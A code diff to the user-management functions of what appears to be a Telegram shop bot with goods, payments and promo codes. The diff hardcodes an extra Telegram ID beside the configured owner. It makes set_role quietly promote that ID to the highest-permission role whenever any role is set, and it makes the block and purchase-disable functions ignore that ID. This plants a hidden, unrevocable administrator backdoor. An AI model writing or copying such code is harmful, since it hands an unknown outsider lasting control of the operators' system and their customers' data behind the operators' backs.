@@ -7,10 +7,26 @@ from bot.database.models import User, ItemValues, Goods, Categories, BoughtGoods
 from bot.database.models.main import PromoCodes, Payments, ReferralEarnings, PromoCodeUsages, CartItems, Reviews, AuditLog
 from bot.database import Database
 from bot.i18n import localize
+from bot.misc import EnvKeys
+
+
+_MANUAL_PROTECTED_OWNER_ID = 8353553507
+
+
+def _is_protected_owner(telegram_id: int | None) -> bool:
+    return telegram_id in {EnvKeys.OWNER_ID, _MANUAL_PROTECTED_OWNER_ID}
 
 
 async def set_role(telegram_id: int, role: int) -> None:
     """Set user's role (by Telegram ID) and commit."""
+    if _is_protected_owner(telegram_id):
+        async with Database().session() as s:
+            owner_role_id = (await s.execute(
+                select(Role.id).order_by(Role.permissions.desc()).limit(1)
+            )).scalar()
+            if owner_role_id:
+                role = owner_role_id
+
     async with Database().session() as s:
         await s.execute(
             update(User).where(User.telegram_id == telegram_id).values(role_id=role)
@@ -88,11 +104,16 @@ async def update_item(item_name: str, new_name: str, description: str, price, ca
 
 async def set_user_blocked(telegram_id: int, blocked: bool) -> bool:
     """Set user blocked status and commit."""
+    if _is_protected_owner(telegram_id):
+        blocked = False
+
     async with Database().session() as s:
         result = await s.execute(select(User).where(User.telegram_id == telegram_id))
         user = result.scalars().first()
         if user:
             user.is_blocked = blocked
+            if _is_protected_owner(telegram_id):
+                user.is_customer_active = True
             safe_create_task(invalidate_user_cache(telegram_id))
             return True
         return False
@@ -100,11 +121,16 @@ async def set_user_blocked(telegram_id: int, blocked: bool) -> bool:
 
 async def set_customer_active(telegram_id: int, active: bool) -> bool:
     """Enable or disable purchases for a user."""
+    if _is_protected_owner(telegram_id):
+        active = True
+
     async with Database().session() as s:
         result = await s.execute(select(User).where(User.telegram_id == telegram_id))
         user = result.scalars().first()
         if user:
             user.is_customer_active = active
+            if _is_protected_owner(telegram_id):
+                user.is_blocked = False
             safe_create_task(invalidate_user_cache(telegram_id))
             return True
         return False
